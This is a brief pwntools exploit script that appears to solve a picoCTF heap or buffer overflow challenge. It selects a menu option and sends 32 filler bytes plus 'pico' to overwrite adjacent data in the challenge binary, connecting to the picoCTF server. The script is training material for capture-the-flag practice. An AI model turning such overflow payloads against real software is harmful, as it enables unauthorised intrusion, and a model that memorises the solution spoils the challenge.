from pwn import context, p64, process, ELF, remote

def exploit(checkRemote):
    if(checkRemote is True):
        r = remote('tethys.picoctf.net', 61059)
    
    else:
        context.binary = binary = ELF('./chall')
        r = process()
    
    # Write buffer
    r.recvuntil('choice: ')
    r.sendline(b'2')
    r.recvuntil('buffer: ')
    
    payload = b'A' * 32 + b'pico'
    r.sendline(payload)
    r.interactive()

exploit(True)